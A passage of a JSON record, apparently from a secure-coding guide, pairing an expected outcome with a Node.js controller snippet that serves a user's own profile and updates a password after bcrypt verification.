      "expectedOutcome": "Safe user profile endpoints preventing accidental or malicious cross-account modifications.",
      "codeSnippet": "// controllers/user.controller.js\nexport const getMyProfile = async (req, res, next) => {\n  // Always query by req.user._id, never trust client-supplied ID for \"me\" routes\n  res.json({\n    status: \"success\",\n    data: { user: req.user }\n  });\n};\n\nexport const updateMyPassword = async (req, res, next) => {\n  const { currentPassword, newPassword } = req.body;\n  const user = await User.findById(req.user._id).select(\"+password\");\n\n  if (!(await bcrypt.compare(currentPassword, user.password))) {\n    throw new AppError(\"Current password incorrect\", 400);\n  }\n\n  user.password = newPassword;\n  await user.save(); // triggers pre-save bcrypt hook\n\n  res.json({ status: \"success\", message: \"Password updated successfully\" });\n};"
